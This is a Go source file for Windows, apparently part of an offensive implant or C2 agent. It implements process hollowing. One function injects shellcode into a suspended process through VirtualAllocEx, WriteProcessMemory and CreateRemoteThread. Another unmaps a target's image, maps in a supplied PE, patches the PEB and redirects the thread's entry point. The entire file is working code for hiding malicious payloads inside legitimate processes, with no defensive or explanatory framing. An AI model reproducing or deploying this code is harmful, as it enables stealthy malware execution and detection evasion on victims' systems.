//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows API procs for process hollowing.
// procVirtualAllocEx is declared in inject_windows.go — reused here.
var (
	ntdllHollow         = windows.NewLazySystemDLL("ntdll.dll")
	procWriteProcMem    = windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
	procCreateRemThread = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThread")
	procNtGetContext    = ntdllHollow.NewProc("NtGetContextThread")
	procNtSetContext    = ntdllHollow.NewProc("NtSetContextThread")
	procNtUnmapSection = ntdllHollow.NewProc("NtUnmapViewOfSection")
)

// hollowVirtualAllocEx allocates memory in a remote process.
func hollowVirtualAllocEx(proc windows.Handle, addr, size, allocType, protect uintptr) (uintptr, error) {
	ret, _, err := procVirtualAllocEx.Call(uintptr(proc), addr, size, allocType, protect)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

// writeProcessMemory writes bytes into a remote process.
func writeProcessMemory(proc windows.Handle, addr uintptr, data []byte) (uintptr, error) {
	var written uintptr
	r, _, err := procWriteProcMem.Call(
		uintptr(proc), addr,
		uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		return 0, err
	}
	return written, nil
}

// hollowProcess creates a suspended target process and injects shellcode via CreateRemoteThread.
func hollowProcess(targetExe string, shellcode []byte) (string, error) {
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}

	targetPtr, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return "", fmt.Errorf("UTF16: %w", err)
	}

	err = windows.CreateProcess(
		nil, targetPtr, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	)
	if err != nil {
		return "", fmt.Errorf("CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)

	baseAddr, err := hollowVirtualAllocEx(
		pi.Process, 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Process)
		return "", fmt.Errorf("VirtualAllocEx: %w", err)
	}

	written, err := writeProcessMemory(pi.Process, baseAddr, shellcode)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Process)
		return "", fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Create remote thread at shellcode base — no need to manipulate thread context
	var tid uint32
	hThread, _, e := procCreateRemThread.Call(
		uintptr(pi.Process), 0, 0,
		baseAddr, 0, 0,
		uintptr(unsafe.Pointer(&tid)),
	)
	windows.CloseHandle(pi.Process)
	if hThread == 0 {
		return "", fmt.Errorf("CreateRemoteThread: %w", e)
	}
	windows.CloseHandle(windows.Handle(hThread))

	return fmt.Sprintf("[+] Hollowed %s (PID %d) — %d bytes at 0x%X, thread TID %d",
		targetExe, pi.ProcessId, written, baseAddr, tid), nil
}

// ─── CONTEXT structure for x64 (must be 16-byte aligned, hand-rolled) ────────
// Matches CONTEXT in winnt.h for AMD64.
type x64Context struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags                                    uint32
	MxCsr                                           uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs        uint16
	EFlags                                          uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                    uint64
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64
	R8, R9, R10, R11, R12, R13, R14, R15            uint64
	Rip                                             uint64
	// XMM and floating-point state omitted for brevity
	_pad [0x4a0 - 0x108]byte
}

const CONTEXT_FULL_LOCAL = 0x10000B // CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS

// hollowPE replaces a suspended process's image with a supplied PE binary.
func hollowPE(targetExe string, peBytes []byte) (string, error) {
	if len(peBytes) < 0x40 {
		return "", fmt.Errorf("PE too small")
	}

	dosHeader := binary.LittleEndian.Uint32(peBytes[0x3C:])
	if int(dosHeader)+0x58 > len(peBytes) {
		return "", fmt.Errorf("invalid PE headers")
	}
	preferredBase := uintptr(binary.LittleEndian.Uint64(peBytes[dosHeader+0x30:]))
	entryRVA     := uintptr(binary.LittleEndian.Uint32(peBytes[dosHeader+0x28:]))
	imageSize    := binary.LittleEndian.Uint32(peBytes[dosHeader+0x50:])
	hdrSize      := binary.LittleEndian.Uint32(peBytes[dosHeader+0x54:])

	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}
	targetPtr, _ := windows.UTF16PtrFromString(targetExe)

	err := windows.CreateProcess(nil, targetPtr, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi)
	if err != nil {
		return "", fmt.Errorf("CreateProcess: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)

	procNtUnmapSection.Call(uintptr(pi.Process), preferredBase)

	newBase, err := hollowVirtualAllocEx(
		pi.Process, preferredBase, uintptr(imageSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil || newBase == 0 {
		newBase, err = hollowVirtualAllocEx(pi.Process, 0, uintptr(imageSize),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			windows.TerminateProcess(pi.Process, 1)
			windows.CloseHandle(pi.Process)
			return "", fmt.Errorf("VirtualAllocEx: %w", err)
		}
	}

	// Write PE headers
	if uint32(len(peBytes)) > hdrSize {
		writeProcessMemory(pi.Process, newBase, peBytes[:hdrSize])
	} else {
		writeProcessMemory(pi.Process, newBase, peBytes)
	}

	// Write sections
	numSec    := int(binary.LittleEndian.Uint16(peBytes[dosHeader+6:]))
	optHdrSz  := uint32(binary.LittleEndian.Uint16(peBytes[dosHeader+0x14:]))
	secBase   := dosHeader + 0x18 + optHdrSz
	for i := 0; i < numSec; i++ {
		off := secBase + uint32(i)*40
		if int(off)+40 > len(peBytes) {
			break
		}
		rawSize := binary.LittleEndian.Uint32(peBytes[off+16:])
		rawOff  := binary.LittleEndian.Uint32(peBytes[off+20:])
		vaddr   := uintptr(binary.LittleEndian.Uint32(peBytes[off+12:]))
		if rawSize == 0 || int(rawOff+rawSize) > len(peBytes) {
			continue
		}
		writeProcessMemory(pi.Process, newBase+vaddr, peBytes[rawOff:rawOff+rawSize])
	}

	// Read + update thread context to redirect entry point
	ctx := x64Context{}
	ctx.ContextFlags = CONTEXT_FULL_LOCAL
	procNtGetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	// Fix PEB ImageBase (PEB+0x10 on x64)
	peb := ctx.Rdx
	ibBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(ibBytes, uint64(newBase))
	writeProcessMemory(pi.Process, uintptr(peb)+0x10, ibBytes)

	ctx.Rip = uint64(newBase + entryRVA)
	procNtSetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	windows.ResumeThread(pi.Thread)
	windows.CloseHandle(pi.Process)

	return fmt.Sprintf("[+] PE hollowed into %s (PID %d) base=0x%X EP=0x%X",
		targetExe, pi.ProcessId, newBase, newBase+entryRVA), nil
}
